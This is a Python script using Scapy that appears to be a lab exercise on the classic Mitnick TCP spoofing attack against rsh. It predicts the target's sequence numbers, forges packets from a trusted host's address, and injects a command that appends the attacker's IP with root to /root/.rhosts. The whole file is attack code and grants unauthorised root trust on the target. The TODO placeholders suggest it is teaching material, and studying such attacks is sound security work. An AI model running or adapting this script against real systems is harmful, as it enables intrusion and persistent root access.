#!/usr/bin/env python3

from scapy.all import *
import sys
import time
import random

SRC_PORT = 1023
DST_PORT = 514

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])
    conf.verb = 0
    command = "echo '" + my_ip + " root' >> /root/.rhosts"
    payload = 'root\0root\0' + command + '\0'
    payload = str.encode(payload)

    #TODO: figure out SYN sequence number pattern
    p = IP(dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='S', seq=0)
    resp = sr1(p)
    ack = resp[TCP].seq + 128000 + 1
    time.sleep(1)

    #TODO: TCP hijacking with predicted sequence number
    seq = random.randint(0, 0xffffff)

    # SYN
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='S', seq=seq)
    send(p)
    seq += 1
    time.sleep(1)

    # ACK
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='A', seq=seq, ack=ack)
    send(p)

    # Callback
    callback_port = b'0\0'
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='AP', seq=seq, ack=ack) / Raw(load=callback_port)
    send(p)
    seq += len(callback_port)
    time.sleep(1)

    # Payload
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='AP', seq=seq, ack=ack) / Raw(load=payload)
    send(p)
